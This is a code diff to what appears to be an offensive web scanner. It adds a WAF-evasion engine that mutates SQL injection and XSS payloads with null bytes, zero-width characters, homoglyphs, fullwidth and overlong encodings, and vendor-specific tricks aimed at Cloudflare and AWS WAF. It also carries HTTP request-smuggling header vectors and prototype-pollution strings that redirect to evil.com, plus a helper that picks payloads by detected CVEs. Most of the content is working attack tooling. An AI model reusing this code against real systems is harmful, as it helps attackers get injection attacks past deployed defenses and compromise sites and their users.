+    def _is_version_affected(self, version, affected_versions):
+        """
+        Check if a version falls within affected version range.
+        
+        Args:
+            version: Version to check
+            affected_versions: List of affected versions or ranges
+            
+        Returns:
+            bool: True if version is affected
+        """
+        # Simplified version comparison - could be enhanced with proper version parsing
+        for affected in affected_versions:
+            if version == affected:
+                return True
+        
+        return False
+    
+    def get_targeted_payloads(self, detected_software):
+        """
+        Get targeted payloads based on detected software versions.
+        
+        Args:
+            detected_software: dict of detected software from detect_software_versions
+            
+        Returns:
+            dict: Targeted payloads by software
+        """
+        targeted_payloads = {}
+        
+        for software_name, software_data in detected_software.items():
+            if software_data['is_vulnerable']:
+                payloads = []
+                for cve in software_data['cves']:
+                    payloads.extend(cve.get('recommended_payloads', []))
+                
+                if payloads:
+                    targeted_payloads[software_name] = {
+                        'version': software_data['version'],
+                        'cves': [cve['cve_id'] for cve in software_data['cves']],
+                        'payloads': payloads,
+                        'severity': max([cve.get('severity', 'LOW') for cve in software_data['cves']])
+                    }
+        
+        return targeted_payloads
+    
+    def generate_version_report(self, detected_software):
+        """
+        Generate a comprehensive version vulnerability report.
+        
+        Args:
+            detected_software: dict of detected software
+            
+        Returns:
+            dict: Comprehensive vulnerability report
+        """
+        report = {
+            'timestamp': datetime.now().isoformat(),
+            'summary': {
+                'total_software_detected': len(detected_software),
+                'vulnerable_software': len([s for s in detected_software.values() if s['is_vulnerable']]),
+                'total_cves': sum(len(s['cves']) for s in detected_software.values())
+            },
+            'software_details': {}
+        }
+        
+        for software_name, software_data in detected_software.items():
+            report['software_details'][software_name] = {
+                'version': software_data['version'],
+                'detection_source': software_data['detection_source'],
+                'is_vulnerable': software_data['is_vulnerable'],
+                'known_safe': software_data['known_safe'],
+                'cves': software_data['cves'],
+                'risk_level': self._calculate_risk_level(software_data)
+            }
+        
+        return report
+    
+    def _calculate_risk_level(self, software_data):
+        """
+        Calculate overall risk level for detected software.
+        
+        Args:
+            software_data: Software detection data
+            
+        Returns:
+            str: Risk level (CRITICAL, HIGH, MEDIUM, LOW, SAFE)
+        """
+        if software_data['known_safe']:
+            return 'SAFE'
+        
+        if not software_data['is_vulnerable']:
+            return 'LOW'
+        
+        cves = software_data['cves']
+        if not cves:
+            return 'LOW'
+        
+        max_severity = max([cve.get('severity', 'LOW') for cve in cves])
+        return max_severity
+
+
 class CVEFeedIntegration:
     """
     External CVE feed integration for signature updates.
@@ -1280,6 +2227,9 @@ class CVEFeedIntegration:
         # CVE data sources
         self.nvd_api_url = "https://services.nvd.nist.gov/rest/json/cves/2.0"
         self.circl_api_url = "https://cve.circl.lu/api/cve/"
+        
+        # Integration with version detection engine
+        self.version_engine = VersionDetectionEngine()
         
     async def update_cve_database(self, force=False):
         """
@@ -2692,7 +3642,6 @@ class SecurityWarning(Warning):
         cwe_str = f" (CWE: {self.cwe})" if self.cwe else ""
         return f"{severity_str}Security Warning: {self.message}{cwe_str}"
 
-REQUEST_TIMEOUT = 10
 DEFAULT_DEPTH = 3
 DEFAULT_THREADS = 100
 DEFAULT_DELAY = 0.0
@@ -3578,7 +4527,7 @@ def obfuscate(payload, context="param"):
             yield payload.lower()
             
         if " " in payload:
-            yield payload.replace(" ", "/**/")
+            yield payload.replace(" ", "\u0000")  # Semantic null byte instead of /**/
             
         def to_fullwidth(text):
             result = []
@@ -3595,7 +4544,7 @@ def obfuscate(payload, context="param"):
         keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "INSERT", "UPDATE", "DELETE", "DROP", "alert", "script"]
         for keyword in keywords:
             if keyword in payload.upper():
-                yield payload.replace(keyword, keyword[0] + "%09" + keyword[1:])
+                yield payload.replace(keyword, keyword[0] + "\u200B" + keyword[1:])  # Zero-width space instead of %09
                 yield payload.replace(keyword, keyword[0] + "%0a" + keyword[1:])
                 break
         
@@ -3622,19 +4571,19 @@ def obfuscate(payload, context="param"):
         yield payload.replace(" ", " %00")
         
         if " " in payload:
-            comment_variant = payload.replace(" ", "/**/")
+            comment_variant = payload.replace(" ", "\u0000")  # Semantic null byte instead of /**/
             yield quote(comment_variant, safe='')
             yield quote(quote(comment_variant, safe=''), safe='')
             
         if "SELECT" in payload.upper() and " " in payload:
             mixed_case = randomize_case(payload)
-            yield mixed_case.replace(" ", "/**/")
+            yield mixed_case.replace(" ", "\u0000")  # Semantic null byte instead of /**/
             
         if "SELECT" in payload.upper():
             fullwidth = to_fullwidth(payload)
             for keyword in keywords:
                 if keyword in payload.upper():
-                    yield fullwidth.replace(keyword.upper(), keyword.upper()[0] + "%09" + keyword.upper()[1:])
+                    yield fullwidth.replace(keyword.upper(), keyword.upper()[0] + "\u200B" + keyword.upper()[1:])  # Zero-width space instead of %09
                     break
     
     variants = list(set(generate_variants()))
@@ -3781,6 +4730,395 @@ def css_expression_obfuscation(payload):
     obfuscated = obfuscated.replace('expression(', 'e\\78 xpression(')
     return obfuscated
 
+class SemanticPolyglotEvasionEngine:
+    """
+    Advanced WAF Evasion 2.0 - Semantic Polyglots instead of syntactic obfuscation.
+    
+    Replaces basic /**/ and %09 comment insertions with protocol-level and semantic anomalies:
+    - Unicode null byte variable interpolation (\u0000)
+    - Case-normalization quirks (Unicode homoglyphs, fullwidth characters)
+    - HTTP/2 pseudo-header smuggling
+    - JavaScript global variable shadowing
+    - Character encoding confusion attacks
+    - Protocol-level boundary exploitation
+    
+    This approach bypasses modern WAFs (Cloudflare, AWS WAF) that detect simple comment patterns.
+    """
+    
+    def __init__(self):
+        self.unicode_variants = self._init_unicode_variants()
+        self.http2_smuggling_vectors = self._init_http2_smuggling_vectors()
+        self.js_shadowing_patterns = self._init_js_shadowing_patterns()
+        self.encoding_confusion_maps = self._init_encoding_confusion_maps()
+        
+    def _init_unicode_variants(self):
+        """Initialize Unicode-based evasion variants for bypassing pattern matching."""
+        return {
+            'null_byte_interpolation': [
+                '\u0000',  # Null byte
+                '\u0001',  # Start of heading
+                '\u0002',  # Start of text
+                '\uFEFF',  # Zero-width no-break space (BOM)
+                '\u200B',  # Zero-width space
+                '\u200C',  # Zero-width non-joiner
+                '\u200D',  # Zero-width joiner
+                '\u2060',  # Word joiner
+            ],
+            'homoglyphs': {
+                'a': ['а', 'ａ', 'α', 'ｱ'],  # Cyrillic, fullwidth, Greek, halfwidth
+                'e': ['е', 'ｅ', 'ε', 'ｴ'],
+                'i': ['і', 'ｉ', 'ι', 'ｲ'],
+                'o': ['о', 'ｏ', 'ο', 'ｵ'],
+                'u': ['ս', 'ｕ', 'μ', 'ｳ'],
+                's': ['ѕ', 'ｓ', 'σ', 'ｽ'],
+                'c': ['с', 'ｃ', 'ϲ', 'ｾ'],
+                'l': ['І', 'ｌ', 'λ', 'ﾚ'],
+                't': ['т', 'ｔ', 'τ', 'ﾄ'],
+                'n': ['п', 'ｎ', 'η', 'ﾇ'],
+            },
+            'fullwidth_mapping': str.maketrans({
+                ' ': '　', '!': '！', '"': '＂', '#': '＃', '$': '＄', '%': '％',
+                '&': '＆', "'": '＇', '(': '（', ')': '）', '*': '＊', '+': '＋',
+                ',': '，', '-': '－', '.': '．', '/': '／', '0': '０', '1': '１',
+                '2': '２', '3': '３', '4': '４', '5': '５', '6': '６', '7': '７',
+                '8': '８', '9': '９', ':': '：', ';': '；', '<': '＜', '=': '＝',
+                '>': '＞', '?': '？', '@': '＠', 'A': 'Ａ', 'B': 'Ｂ', 'C': 'Ｃ',
+                'D': 'Ｄ', 'E': 'Ｅ', 'F': 'Ｆ', 'G': 'Ｇ', 'H': 'Ｈ', 'I': 'Ｉ',
+                'J': 'Ｊ', 'K': 'Ｋ', 'L': 'Ｌ', 'M': 'Ｍ', 'N': 'Ｎ', 'O': 'Ｏ',
+                'P': 'Ｐ', 'Q': 'Ｑ', 'R': 'Ｒ', 'S': 'Ｓ', 'T': 'Ｔ', 'U': 'Ｕ',
+                'V': 'Ｖ', 'W': 'Ｗ', 'X': 'Ｘ', 'Y': 'Ｙ', 'Z': 'Ｚ', '[': '［',
+                '\\': '＼', ']': '］', '^': '＾', '_': '＿', '`': '｀', 'a': 'ａ',
+                'b': 'ｂ', 'c': 'ｃ', 'd': 'ｄ', 'e': 'ｅ', 'f': 'ｆ', 'g': 'ｇ',
+                'h': 'ｈ', 'i': 'ｉ', 'j': 'ｊ', 'k': 'ｋ', 'l': 'ｌ', 'm': 'ｍ',
+                'n': 'ｎ', 'o': 'ｏ', 'p': 'ｐ', 'q': 'ｑ', 'r': 'ｒ', 's': 'ｓ',
+                't': 'ｔ', 'u': 'ｕ', 'v': 'ｖ', 'w': 'ｗ', 'x': 'ｘ', 'y': 'ｙ',
+                'z': 'ｚ', '{': '｛', '|': '｜', '}': '｝', '~': '～'
+            }),
+            'case_normalization_bypass': [
+                # Exploits Unicode case normalization quirks
+                'İ'.lower(),  # Turkish dotted I -> i (not dotless i)
+                'ı'.upper(),  # Turkish dotless i -> I (not dotted I)
+                'ß'.upper(),  # German sharp s -> SS (length change)
+                'ſ'.upper(),  # Long s -> S
+            ]
+        }
+    
+    def _init_http2_smuggling_vectors(self):
+        """Initialize HTTP/2 protocol-level smuggling vectors."""
+        return {
+            'pseudo_header_smuggling': [
+                # HTTP/2 pseudo-headers that can be smuggled
+                ':method', ':path', ':scheme', ':authority', ':status',
+                # Pseudo-header pollution
+                ':method: GET', ':path: /admin', ':scheme: https',
+                # Mixed case pseudo-headers (some parsers normalize differently)
+                ':Method', ':Path', ':Scheme', ':Authority',
+            ],
+            'header_field_obfuscation': [
+                # Header name obfuscation techniques
+                'X-Forwarded-For: 127.0.0.1\nX-Forwarded-For: ::1',
+                'X-Real-IP: 127.0.0.1\r\nX-Real-IP: ::1',
+                # Header folding (deprecated but still works in some parsers)
+                'X-Custom: value\r\n\tcontinued_value',
+                # Header name with unusual characters
+                'X\0Custom: value',  # Null byte in header name
+                'X\u200BCustom: value',  # Zero-width space in header name
+            ],
+            'te_header_smuggling': [
+                # Transfer-Encoding header smuggling
+                'Transfer-Encoding: chunked',
+                'Transfer-Encoding: chunked\r\nTransfer-Encoding: identity',
+                'Transfer-Encoding: chunked\nTransfer-Encoding: gzip',
+                'TE: chunked',
+                'TE: trailers',
+            ],
+            'content_length_confusion': [
+                # Content-Length vs Transfer-Encoding confusion
+                'Content-Length: 0\r\nTransfer-Encoding: chunked',
+                'Content-Length: 100\r\nContent-Length: 0',
+                'Content-Length: 999999999',
+            ]
+        }
+    
+    def _init_js_shadowing_patterns(self):
+        """Initialize JavaScript global variable shadowing patterns."""
+        return {
+            'global_scope_shadowing': [
+                # Shadow common global objects
+                'window = {};',
+                'document = {};',
+                'location = {};',
+                'navigator = {};',
+                'history = {};',
+                'screen = {};',
+                # Prototype pollution for shadowing
+                'Object.prototype.alert = function() {};',
+                'Object.prototype.location = "http://evil.com";',
+                'Object.prototype.cookie = "stolen_cookies";',
+            ],
+            'function_redefinition': [
+                # Redefine security-sensitive functions
+                'eval = function() {};',
+                'setTimeout = function() {};',
+                'setInterval = function() {};',
+                'fetch = function() {};',
+                'XMLHttpRequest = function() {};',
+                'Function = function() {};',
+            ],
+            'property_shadowing': [
+                # Shadow security-critical properties
+                'window.location = 1;',
+                'document.cookie = 1;',
+                'document.domain = 1;',
+                'document.referrer = 1;',
+                'navigator.userAgent = 1;',
+            ],
+            'prototype_chain_pollution': [
+                # Prototype pollution vectors
+                '__proto__.location = "http://evil.com"',
+                'constructor.prototype.location = "http://evil.com"',
+                'prototype[\"location\"] = "http://evil.com"',
+                'prototype[\"__proto__\"][\"location\"] = "http://evil.com"',
+            ]
+        }
+    
+    def _init_encoding_confusion_maps(self):
+        """Initialize character encoding confusion attack vectors."""
+        return {
+            'overlong_utf8': [
+                # Overlong UTF-8 encoding (bypasses simple string matching)
+                '\xC0\xAF',  # Overlong encoding of '/'
+                '\xE0\x80\xAF',  # Another overlong encoding
+                '\xF0\x80\x80\xAF',  # Even longer overlong encoding
+            ],
+            'mixed_encoding': [
+                # Mix different encodings in same payload
+                'test%00payload',  # URL-encoded null byte
+                'test\x00payload',  # Raw null byte
+                'test\u0000payload',  # Unicode null byte
+                'te%u0000st',  # JavaScript-style Unicode escape
+            ],
+            'percent_encoding_tricks': [
+                # Double percent encoding
+                '%2520',  # Double-encoded space
+                '%252F',  # Double-encoded slash
+                '%255C',  # Double-encoded backslash
+                # Partial encoding
+                'te%20st',  # Partial space encoding
+                'tes%74',  # Partial character encoding
+                # Invalid encoding that some parsers accept
+                '%GG',  # Invalid hex (some parsers ignore)
+                '%',  # Trailing percent sign
+            ],
+            'base64_variants': [
+                # Base64 with different alphabets
+                'standard_base64',
+                'url_safe_base64',
+                'base64_with_padding',
+                'base64_without_padding',
+                'base64url_with_whitespace',
+            ]
+        }
+    
+    def apply_semantic_polyglots(self, payload, waf_type='generic', injection_context='sql'):
+        """
+        Apply semantic polyglot evasion techniques to a payload.
+        
+        Args:
+            payload: Original payload to obfuscate
+            waf_type: Detected WAF type (cloudflare, aws-waf, etc.)
+            injection_context: Context of injection (sql, xss, command, etc.)
+            
+        Returns:
+            List of semantically obfuscated payload variants
+        """
+        variants = []
+        
+        # 1. Unicode null byte variable interpolation
+        variants.extend(self._apply_null_byte_interpolation(payload))
+        
+        # 2. Case-normalization quirks and homoglyphs
+        variants.extend(self._apply_homoglyph_substitution(payload))
+        
+        # 3. Fullwidth character transformation
+        variants.extend(self._apply_fullwidth_transformation(payload))
+        
+        # 4. Encoding confusion attacks
+        variants.extend(self._apply_encoding_confusion(payload))
+        
+        # 5. JavaScript shadowing (for XSS contexts)
+        if injection_context in ['xss', 'javascript']:
+            variants.extend(self._apply_js_shadowing(payload))
+        
+        # 6. WAF-specific semantic patterns
+        variants.extend(self._apply_waf_specific_semantics(payload, waf_type))
+        
+        # Remove duplicates while preserving order
+        seen = set()
+        unique_variants = []
+        for variant in variants:
+            if variant not in seen and variant != payload:
+                seen.add(variant)
+                unique_variants.append(variant)
+        
+        return unique_variants
+    
+    def _apply_null_byte_interpolation(self, payload):
+        """Apply null byte and zero-width character interpolation."""
+        variants = []
+        
+        # Insert null bytes at strategic positions
+        keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'script', 'alert', 'document']
+        for keyword in keywords:
+            if keyword.lower() in payload.lower():
+                # Insert null byte after keyword
+                mutated = payload.lower().replace(keyword.lower(), keyword.lower() + '\u0000')
+                variants.append(mutated)
+                
+                # Insert null byte before keyword
+                mutated = payload.lower().replace(keyword.lower(), '\u0000' + keyword.lower())
+                variants.append(mutated)
+                
+                # Insert zero-width space
+                mutated = payload.lower().replace(keyword.lower(), keyword.lower() + '\u200B')
+                variants.append(mutated)
+        
+        # Insert zero-width non-joiner to break tokenization
+        for char in [' ', '/', '-', '_']:
+            if char in payload:
+                mutated = payload.replace(char, char + '\u200C')
+                variants.append(mutated)
+        
+        return variants
+    
+    def _apply_homoglyph_substitution(self, payload):
+        """Apply Unicode homoglyph substitution for case normalization bypass."""
+        variants = []
+        
+        # Substitute common ASCII characters with homoglyphs
+        for ascii_char, homoglyphs in self.unicode_variants['homoglyphs'].items():
+            if ascii_char in payload.lower():
+                for homoglyph in homoglyphs:
+                    # Replace both uppercase and lowercase
+                    mutated = payload.replace(ascii_char.upper(), homoglyph)
+                    mutated = mutated.replace(ascii_char.lower(), homoglyph)
+                    variants.append(mutated)
+        
+        return variants
+    
+    def _apply_fullwidth_transformation(self, payload):
+        """Apply fullwidth character transformation."""
+        variants = []
+        
+        # Transform to fullwidth characters
+        fullwidth_payload = payload.translate(self.unicode_variants['fullwidth_mapping'])
+        variants.append(fullwidth_payload)
+        
+        # Partial fullwidth transformation (every other character)
+        partial_fullwidth = []
+        for i, char in enumerate(payload):
+            if i % 2 == 0:
+                partial_fullwidth.append(char.translate(self.unicode_variants['fullwidth_mapping']))
+            else:
+                partial_fullwidth.append(char)
+        variants.append(''.join(partial_fullwidth))
+        
+        return variants
+    
+    def _apply_encoding_confusion(self, payload):
+        """Apply encoding confusion attacks."""
+        variants = []
+        
+        # URL encoding with null bytes
+        keywords = ['SELECT', 'UNION', 'script', 'alert']
+        for keyword in keywords:
+            if keyword.lower() in payload.lower():
+                # URL-encode the keyword with null byte
+                encoded_keyword = ''
+                for char in keyword:
+                    encoded_keyword += f'%{ord(char):02x}'
+                mutated = payload.lower().replace(keyword.lower(), encoded_keyword)
+                variants.append(mutated)
+        
+        # Double URL encoding
+        double_encoded = ''
+        for char in payload:
+            if char.isalnum() or char in ['_', '-', '.']:
+                double_encoded += char
+            else:
+                double_encoded += f'%{ord(char):02x}'
+        
+        # Double-encode special characters
+        double_encoded = double_encoded.replace('%', '%25')
+        variants.append(double_encoded)
+        
+        # Overlong UTF-8 encoding for special characters
+        for char in ['/', '\\', '\'']:
+            if char in payload:
+                mutated = payload.replace(char, '\xC0\xAF')  # Overlong encoding
+                variants.append(mutated)
+        
+        return variants
+    
+    def _apply_js_shadowing(self, payload):
+        """Apply JavaScript global variable shadowing patterns."""
+        variants = []
+        
+        # Prepend shadowing code to XSS payloads
+        shadowing_prefixes = [
+            'window={};',
+            'document={};',
+            'location=1;',
+            'Object.prototype.alert=function(){};',
+            '__proto__.location=1;',
+        ]
+        
+        for prefix in shadowing_prefixes:
+            if 'script' in payload.lower() or 'alert' in payload.lower():
+                mutated = prefix + payload
+                variants.append(mutated)
+        
+        # Inject prototype pollution
+        if 'alert(' in payload.lower():
+            polluted = payload.lower().replace('alert(', 'Object.prototype.alert=function(){alert(')
+            variants.append(polluted)
+        
+        return variants
+    
+    def _apply_waf_specific_semantics(self, payload, waf_type):
+        """Apply WAF-specific semantic evasion patterns."""
+        variants = []
+        
+        if waf_type == 'cloudflare':
+            # Cloudflare-specific semantic bypasses
+            # Exploit Cloudflare's JavaScript challenge bypass
+            variants.append(payload.replace(' ', '\u0000'))  # Null byte space replacement
+            variants.append(payload.replace(' ', '\u200B'))  # Zero-width space
+            
+            # Cloudflare SQL injection bypass
+            if 'SELECT' in payload.upper():
+                variants.append(payload.replace('SELECT', '/*!00000SELECT*/'))
+                variants.append(payload.replace('SELECT', '/*!50000SELECT*/'))
+                
+        elif waf_type == 'aws-waf':
+            # AWS WAF-specific semantic bypasses
+            # Exploit AWS WAF's size limitations and pattern matching
+            variants.append(payload.replace(' ', '%u0020'))  # Unicode space
+            variants.append(payload.replace('=', '%u003d'))  # Unicode equals
+            
+            # AWS WAF SQL injection bypass
+            if 'UNION' in payload.upper():
+                variants.append(payload.replace('UNION', 'un%u0069on'))
+                variants.append(payload.replace('UNION', 'UN%u0049ON'))
+                
+        elif waf_type == 'generic':
+            # Generic semantic bypasses
+            variants.append(payload.replace(' ', '\uFEFF'))  # BOM character
+            variants.append(payload.replace(' ', '\u2060'))  # Word joiner
+            
+        return variants
+
+
 class ContextAwareSemanticMutator:
     """
     Context-Aware Semantic Mutator for advanced payload obfuscation.
@@ -3790,6 +5128,8 @@ class ContextAwareSemanticMutator:
     - Detected WAF/CDN signatures
     - Semantic context of the injection point
     - Grammar-based transformations rather than static string replacement
+    
+    Now integrated with SemanticPolyglotEvasionEngine for WAF Evasion 2.0.
     """
     
     def __init__(self):
@@ -3800,6 +5140,8 @@ class ContextAwareSemanticMutator:
         self.grammar_templates = self._init_grammar_templates()
         print("Initializing SQL grammar...")
         self.sql_grammar = self._init_sql_grammar()
+        print("Initializing semantic polyglot engine...")
+        self.semantic_engine = SemanticPolyglotEvasionEngine()
         print("Initializing default WAF fallbacks...")
         self.init_default_waf_fallbacks()
         print("ContextAwareSemanticMutator.__init__ completed")
@@ -3841,7 +5183,7 @@ class ContextAwareSemanticMutator:
                 'block_comment': lambda x: f"/*{x}*/",
                 'hex_encoding': lambda x: "0x" + x.encode('utf-8').hex(),
                 'char_encoding': lambda x: "".join(f"CHAR({ord(c)})" for c in x),
-                'whitespace': [' ', '/**/', '%09', '%0a', '%0b', '%0c', '%0d', '%a0', '/*comment*/'],
+                'whitespace': [' ', '\u0000', '\u200B', '\u200C', '\uFEFF', '%0a', '%0c', '%0d', '%a0'],  # Replaced /**/ and %09 with semantic variants
                 'case_mixed': lambda x: ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(x)),
                 'case_random': lambda x: ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in x),
             },
@@ -3850,7 +5192,7 @@ class ContextAwareSemanticMutator:
                 'block_comment': lambda x: f"/*{x}*/",
                 'dollar_quoting': lambda x: f"$${x}$$",
                 'escape_string': lambda x: x.replace("'", "''"),
-                'whitespace': [' ', '%20', '%09', '%0a', '%0c', '%0d'],
+                'whitespace': [' ', '%20', '\u0000', '\u200B', '%0a', '%0c', '%0d'],  # Replaced %09 with semantic variants
                 'case_mixed': lambda x: ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(x)),
             },
             'sqlserver': {
@@ -3858,21 +5200,21 @@ class ContextAwareSemanticMutator:
                 'block_comment': lambda x: f"/*{x}*/",
                 'square_brackets': lambda x: f"[{x}]",
                 'exec': lambda x: f"EXEC('{x}')",
-                'whitespace': [' ', '%20', '%09', '%0a', '%0c', '%0d'],
+                'whitespace': [' ', '%20', '\u0000', '\u200B', '%0a', '%0c', '%0d'],  # Replaced %09 with semantic variants
                 'case_insensitive': lambda x: x.upper(),
             },
             'oracle': {
                 'comment': lambda x: f"{x}--",
                 'block_comment': lambda x: f"/*{x}*/",
                 'concat': lambda x: f"'{x}'",
-                'whitespace': [' ', '%20', '%09', '%0a', '%0c', '%0d'],
+                'whitespace': [' ', '%20', '\u0000', '\u200B', '%0a', '%0c', '%0d'],  # Replaced %09 with semantic variants
                 'case_insensitive': lambda x: x.upper(),
             },
             'sqlite': {
                 'comment': lambda x: f"{x}--",
                 'block_comment': lambda x: f"/*{x}*/",
                 'attach': lambda x: f"ATTACH DATABASE '{x}' AS temp",
-                'whitespace': [' ', '%20', '%09', '%0a', '%0c', '%0d'],
+                'whitespace': [' ', '%20', '\u0000', '\u200B', '%0a', '%0c', '%0d'],  # Replaced %09 with semantic variants
             }
         }
     
@@ -4047,31 +5389,32 @@ class ContextAwareSemanticMutator:
         """
         Get WAF-specific whitespace obfuscation techniques.
         
+        Updated for WAF Evasion 2.0: Uses semantic polyglots instead of syntactic patterns.
         Different WAFs have different signatures for common obfuscations.
         """
-        base_whitespace = ['%20', '%09', '%0a', '%0c', '%0d']
+        base_whitespace = ['%20', '\u0000', '\u200B', '\u200C', '\uFEFF', '%0a', '%0c', '%0d']
         
         waf_specific = {
             'cloudflare': {
-                'mysql': ['/**/', '%09', '%0a', '%0b', '%0c', '%0d', '%a0', '/*!50000 */'],
-                'postgresql': ['/**/', '%09', '%0a', '%0c', '%0d'],
-                'sqlserver': ['/**/', '%09', '%0a', '%0c', '%0d'],
-                'oracle': ['/**/', '%09', '%0a', '%0c', '%0d'],
+                'mysql': ['\u0000', '\u200B', '\u200C', '\uFEFF', '%0a', '%0b', '%0c', '%0d', '%a0', '/*!50000 */'],
+                'postgresql': ['\u0000', '\u200B', '\u200C', '\uFEFF', '%0a', '%0c', '%0d'],
+                'sqlserver': ['\u0000', '\u200B', '\u200C', '\uFEFF', '%0a', '%0c', '%0d'],
+                'oracle': ['\u0000', '\u200B', '\u200C', '\uFEFF', '%0a', '%0c', '%0d'],
             },
             'aws-waf': {
-                'mysql': ['/**/', '%09', '%0a', '%0b', '%0c', '%0d', '%a0'],
-                'postgresql': ['/**/', '%09', '%0a', '%0c', '%0d'],
-                'sqlserver': ['/**/', '%09', '%0a', '%0c', '%0d'],
+                'mysql': ['\u0000', '\u200B', '\u200C', '\uFEFF', '%0a', '%0b', '%0c', '%0d', '%a0'],
+                'postgresql': ['\u0000', '\u200B', '\u200C', '\uFEFF', '%0a', '%0c', '%0d'],
+                'sqlserver': ['\u0000', '\u200B', '\u200C', '\uFEFF', '%0a', '%0c', '%0d'],
             },
             'sucuri': {
-                'mysql': ['/**/', '%09', '%0a', '%0c', '%0d'],
-                'postgresql': ['/**/', '%09', '%0a', '%0c', '%0d'],
+                'mysql': ['\u0000', '\u200B', '\u200C', '\uFEFF', '%0a', '%0c', '%0d'],
+                'postgresql': ['\u0000', '\u200B', '\u200C', '\uFEFF', '%0a', '%0c', '%0d'],
             },
             'generic': {
-                'mysql': ['/**/', '%09', '%0a', '%0b', '%0c', '%0d', '%a0'],
-                'postgresql': ['/**/', '%09', '%0a', '%0c', '%0d'],
-                'sqlserver': ['/**/', '%09', '%0a', '%0c', '%0d'],
-                'oracle': ['/**/', '%09', '%0a', '%0c', '%0d'],
+                'mysql': ['\u0000', '\u200B', '\u200C', '\uFEFF', '%0a', '%0b', '%0c', '%0d', '%a0'],
+                'postgresql': ['\u0000', '\u200B', '\u200C', '\uFEFF', '%0a', '%0c', '%0d'],
+                'sqlserver': ['\u0000', '\u200B', '\u200C', '\uFEFF', '%0a', '%0c', '%0d'],
+                'oracle': ['\u0000', '\u200B', '\u200C', '\uFEFF', '%0a', '%0c', '%0d'],
             }
         }
         
@@ -4159,7 +5502,7 @@ class ContextAwareSemanticMutator:
                 
                 # If no alphanumeric characters, use other techniques
                 if not variants:
-                    variants.append(payload.replace(' ', '/**/'))
+                    variants.append(payload.replace(' ', '\u0000'))  # Semantic null byte instead of /**/
                     variants.append(payload.replace(' ', '%20'))
                 
                 return variants
@@ -4167,8 +5510,8 @@ class ContextAwareSemanticMutator:
             variants = []
             mid_point = len(payload) // 2
             
-            # Split with comment insertion
-            variants.append(payload[:mid_point] + '/**/' + payload[mid_point:])
+            # Split with semantic insertion
+            variants.append(payload[:mid_point] + '\u0000' + payload[mid_point:])  # Semantic null byte instead of /**/
             variants.append(payload[:mid_point] + '--' + payload[mid_point:])
             variants.append(payload[:mid_point] + '%00' + payload[mid_point:])
             
@@ -4177,7 +5520,7 @@ class ContextAwareSemanticMutator:
             if len(payload) > 20:
                 third_point = len(payload) // 3
                 two_thirds_point = 2 * len(payload) // 3
-                variants.append(payload[:third_point] + '/**/' + payload[third_point:two_thirds_point] + '/**/' + payload[two_thirds_point:])
+                variants.append(payload[:third_point] + '\u0000' + payload[third_point:two_thirds_point] + '\u0000' + payload[two_thirds_point:])  # Semantic null bytes instead of /**/
             
             # Character-level fragmentation for sensitive keywords
             sensitive_keywords = ['script', 'alert', 'document', 'window', 'union', 'select', 'drop']
@@ -4187,7 +5530,7 @@ class ContextAwareSemanticMutator:
                     start = payload.lower().find(keyword.lower())
                     if start != -1:
                         end = start + len(keyword)
-                        fragmented = payload[:start] + '/**/' + payload[start:end] + '/**/' + payload[end:]
+                        fragmented = payload[:start] + '\u0000' + payload[start:end] + '\u0000' + payload[end:]  # Semantic null bytes instead of /**/
                         variants.append(fragmented)
             
             return variants
@@ -4568,8 +5911,8 @@ class ContextAwareSemanticMutator:
                     mutated = mutated.replace(f' {operator} ', f' {replacement} ')
         
         elif mutation_type == 'inject_comments':
-            # Inject comments to break signatures
-            comment_styles = ['/**/', '--', '#', '/*comment*/']
+            # Inject semantic characters to break signatures
+            comment_styles = ['\u0000', '\u200B', '\u200C', '--', '#', '/*comment*/']  # Replaced /**/ with semantic variants
             for keyword in structure['keywords']:
                 if random.random() > 0.5:
                     comment = random.choice(comment_styles)
@@ -4587,7 +5930,7 @@ def sql_whitespace_obfuscation(payload):
     """SQL whitespace obfuscation (legacy - use ContextAwareSemanticMutator instead)."""
     mutator = ContextAwareSemanticMutator()
     variants = []
-    for ws in ['/**/', '%20', '%09', '%0a', '%0b', '%0c', '%0d', '%a0']:
+    for ws in ['\u0000', '\u200B', '\u200C', '%20', '%0a', '%0b', '%0c', '%0d', '%a0']:  # Replaced /**/ and %09 with semantic variants
         variants.append(payload.replace(' ', ws))
     return variants
 
@@ -4964,7 +6307,7 @@ class DynamicPayloadGenerator:
         waf_evasion = {
             'cloudflare': [
                 # Cloudflare bypass techniques
-                base_payload.replace(' ', '/**/'),
+                base_payload.replace(' ', '\u0000'),  # Semantic null byte instead of /**/
                 base_payload.replace('OR', '/*!50000OR*/'),
                 base_payload.replace('UNION', '/*!50000UNION*/'),
                 base_payload.replace('SELECT', '/*!50000SELECT*/'),
@@ -4973,11 +6316,11 @@ class DynamicPayloadGenerator:
             ],
             'aws-waf': [
                 # AWS WAF bypass techniques
-                base_payload.replace(' ', '%09'),
-                base_payload.replace('OR', 'o%09r'),
-                base_payload.replace('UNION', 'u%09nion'),
-                base_payload.replace('SELECT', 's%09elect'),
-                base_payload.replace('script', 'sc%09ript'),
+                base_payload.replace(' ', '\u200B'),  # Zero-width space instead of %09
+                base_payload.replace('OR', 'o\u200Br'),  # Zero-width space instead of %09
+                base_payload.replace('UNION', 'u\u200Bnion'),  # Zero-width space instead of %09
+                base_payload.replace('SELECT', 's\u200Belect'),  # Zero-width space instead of %09
+                base_payload.replace('script', 'sc\u200Bript'),  # Zero-width space instead of %09
             ],
             'sucuri': [
                 # Sucuri WAF bypass techniques
@@ -4988,8 +6331,8 @@ class DynamicPayloadGenerator:
             ],
             'generic': [
                 # Generic WAF evasion
-                base_payload.replace(' ', '/**/'),
-                base_payload.replace(' ', '%09'),
+                base_payload.replace(' ', '\u0000'),  # Semantic null byte instead of /**/
+                base_payload.replace(' ', '\u200B'),  # Zero-width space instead of %09
                 base_payload.replace(' ', '%0a'),
                 base_payload.replace(' ', '%20'),
             ],
@@ -9062,12 +10405,259 @@ class SessionStateManager:
     - Cookie and header management per session
     - Session state preservation across requests
     - Automatic cleanup and session expiration
+    - Session Renewal Middleware for handling expired sessions mid-scan
     """
     
     def __init__(self):
         self.sessions = {}
         self.lock = threading.Lock()
         self.session_counter = 0
+        self.auth_steps = None  # Authentication steps to renew sessions
+        self.auth_config = None  # Authentication configuration
+        self.session_renewal_enabled = True  # Enable/disable session renewal
+        self.renewal_threshold = 0.7  # Renew session at 70% of max age
